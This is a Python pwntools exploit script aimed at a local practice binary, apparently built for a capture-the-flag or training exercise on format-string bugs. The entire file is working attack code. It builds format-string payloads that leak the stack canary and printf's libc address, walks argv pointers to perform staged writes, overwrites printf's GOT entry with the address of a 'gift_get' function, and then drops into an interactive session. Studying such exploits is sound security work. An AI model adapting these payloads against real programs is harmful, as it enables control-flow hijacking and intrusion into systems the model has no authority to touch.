import sys
import time
import pwn

sys.path.append('../MyTools')
import conversion

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux',
)

target_info = {
	'exec_path': './fmtstr_example',
	'exec_info': None,
	'addr_len': 0x8,
	'got_name': 'printf',
	'caller_args_save_cnt': 0x5,
	'stack_len': 0x60,
	'heap_func_stack_len': 0x10,
	'align_fix': 0x0,
	'fixed_output_1': b'welcome, ',
	'fixed_output_2': b'format string vuln test for write\n',
}

'''
| callee stack | caller rbp | caller return  | caller stack                              |
| ..., canary  | rbp        | return address | argc, argv, [format string][address], ... |
                                                                |             ^
                                                                |-------------|
[format string] read / write [address]
'''

def align_fix_len_get(data_str):
	target_info['align_fix'] = int(len(data_str) / target_info['addr_len']) * target_info['addr_len']
	if ((len(data_str) % target_info['addr_len']) != 0):
		target_info['align_fix'] += target_info['addr_len']
	align_fix_len = int(target_info['align_fix'] / target_info['addr_len'])
	return align_fix_len

def fmt_str_read_payload_get(got_addr_index):
	example_fmt_str_read = b'|0x%10$lx|0x%10$s'
	got_addr_index += align_fix_len_get(example_fmt_str_read)

	# leak canary
	fmt_str = b'|0x%' + str(canary_index).encode() + b'$lx'

	# read got
	fmt_str += b'|0x%' + str(got_addr_index).encode() + b'$s'

	target_info['align_fix'] = target_info['align_fix'] - len(fmt_str)
	fmt_str += b'A' * target_info['align_fix']

	# target address set
	fmt_str += pwn.p64(addr4got)
	return fmt_str

def fmt_str_write_payload_get(got_addr_index):
	example_fmt_str_wrtie = b'%.1000x%10$n%.10x%10$hn'
	got_addr_index += align_fix_len_get(example_fmt_str_wrtie)

	gitf_addr = target_info['exec_info'].symbols['gift_get']
	print('[**] gift address = {0}'.format(hex(gitf_addr)))

	new_val_4bytes_high = (gitf_addr & 0xffff0000) >> 16
	new_val_2bytes_low = gitf_addr & 0xffff
	cnvrt_size2len_high = new_val_4bytes_high - len(target_info['fixed_output_1'])
	cnvrt_size2len_low = new_val_2bytes_low - cnvrt_size2len_high- len(target_info['fixed_output_1'])
	print('[**] want to change got address to {0}_{1}'.format(hex(new_val_4bytes_high), hex(new_val_2bytes_low)))
	addr4low_bytes_write = addr4got
	addr4high_bytes_write = addr4low_bytes_write + 0x2

	# write got
	fmt_str = b'%.' + str(cnvrt_size2len_high).encode() + b'x'
	fmt_str += b'%' + str(got_addr_index).encode() + b'$n'
	fmt_str += b'%.' + str(cnvrt_size2len_low).encode() + b'x'
	fmt_str += b'%' + str(got_addr_index + 1).encode() + b'$hn'

	target_info['align_fix'] = target_info['align_fix'] - len(fmt_str)
	fmt_str += b'A' * target_info['align_fix']

	# target address set
	fmt_str += pwn.p64(addr4high_bytes_write)
	fmt_str += pwn.p64(addr4low_bytes_write)
	return fmt_str

def fmt_str4heap_payload_2pendal_get():
	# argv in stack address is 1nd pendal
	stack_argv_index = target_info['caller_args_save_cnt'] + int(target_info['heap_func_stack_len'] / target_info['addr_len'])
	stack_argv_index += 2 # rbp && callee return
	stack_argv_index += 1

	pendal_1nd_addr = conn.recvline()
	pendal_1nd_addr = conversion.str2int(pendal_1nd_addr[8:-1])
	pendal_2nd_addr = conn.recvline()
	pendal_2nd_addr = conversion.str2int(pendal_2nd_addr[7:-1])
	pendal_2nd_save_addr = conn.recvline()
	pendal_2nd_save_addr = conversion.str2int(pendal_2nd_save_addr[8:-1])
	print('[++] receive &argv = {0}, argv = {1}, argv[0] = {2}'.format(hex(pendal_1nd_addr), hex(pendal_2nd_addr), hex(pendal_2nd_save_addr)))

	offset = pendal_2nd_addr - pendal_1nd_addr
	offset = int(offset / target_info['addr_len'])
	argv_index = stack_argv_index + offset

	high_4bytes_val = (addr4got & 0xffff0000) >> 16
	low_2bytes_val = addr4got & 0xffff
	print('[**] low = {0}, high = {1}'.format(hex(low_2bytes_val), hex(high_4bytes_val)))

	# bytes 0 - 1
	fmt_str4low = b'%.' + str(low_2bytes_val).encode() + b'x'
	fmt_str4low += b'%' + str(argv_index).encode() + b'$hn'

	argv_0_addr_low_2bytes = pendal_2nd_save_addr & 0xff
	argv_0_addr_low_2bytes += 0x2
	fmt_str4update_addr4middle = b'%.' + str(argv_0_addr_low_2bytes).encode() + b'x'
	fmt_str4update_addr4middle += b'%' + str(stack_argv_index).encode() + b'$hhn'

	# bytes 2 - 6
	fmt_str4middle = b'%.' + str(high_4bytes_val).encode() + b'x'
	fmt_str4middle += b'%' + str(argv_index).encode() + b'$n'

	argv_0_addr_low_2bytes += 0x4
	fmt_str4update_addr4high = b'%.' + str(argv_0_addr_low_2bytes).encode() + b'x'
	fmt_str4update_addr4high += b'%' + str(stack_argv_index).encode() + b'$hhn'

	# bytes 7 - 8
	fmt_str4high = b'%' + str(argv_index).encode() + b'$hn'

	# read got
	offset = pendal_2nd_save_addr - pendal_1nd_addr
	offset = int(offset / target_info['addr_len'])
	argv_index = stack_argv_index + offset
	fmt_str4read_got = b'%' + str(argv_index).encode() + b'$s'

	return fmt_str4low, fmt_str4update_addr4middle, fmt_str4middle, fmt_str4update_addr4high, fmt_str4high, fmt_str4read_got

target_info['exec_info'] = pwn.ELF(target_info['exec_path'])

canary_index = target_info['caller_args_save_cnt'] + int(target_info['stack_len'] / target_info['addr_len'])
print('[**] canary index = {0}'.format(canary_index))
addr4got = target_info['exec_info'].got[target_info['got_name']]
print('[**] {0}@got address = {1}'.format(target_info['got_name'], hex(addr4got)))

got_addr_index = canary_index + 4 # rbp && callee return && argc && argv
got_addr_index += 1

conn = pwn.process(
	argv = [
		target_info['exec_path'],
		b'\x44\x40\x45\x45',
	],
)

fmt_str4read_got = fmt_str_read_payload_get(got_addr_index)
conn.send(fmt_str4read_got)
conn.recvuntil(target_info['fixed_output_1'])
leak_info = conn.recvuntil(b'!\n')
leak_info4canary_val = conversion.str2int(leak_info[3:3 + 16]) # skip [|0x]
leak_info4got_save_addr = conversion.bytes2int(leak_info[19 + 3:19 + 3 + 6]) # skip canary info && [|0x]
print('[++] receive canary value = {0}'.format(hex(leak_info4canary_val)))
print('[++] receive {0}@libc address = {1}'.format(target_info['got_name'], hex(leak_info4got_save_addr)))

fmt_str4heap_low, fmt_str4update_addr4middle, fmt_str4heap_middle, fmt_str4update_addr4high, fmt_str4high, fmt_str4read_got = fmt_str4heap_payload_2pendal_get()
conn.send(fmt_str4heap_low)
time.sleep(1)
conn.send(fmt_str4update_addr4middle)
time.sleep(1)
conn.send(fmt_str4heap_middle)
time.sleep(1)
conn.send(fmt_str4update_addr4high)
time.sleep(1)
conn.send(fmt_str4high)
time.sleep(1)
conn.send(fmt_str4read_got)

fmt_str4wtite_got = fmt_str_write_payload_get(got_addr_index)
conn.send(fmt_str4wtite_got)
leak_data = conn.recvuntil(b'!\n')
end_site = leak_data.find(target_info['fixed_output_2'])
got_save_addr = conversion.bytes2int(leak_data[end_site - 6:end_site])
print('[++] receive {0}@libc address = {1} by heap'.format(target_info['got_name'], hex(got_save_addr)))
conn.interactive()
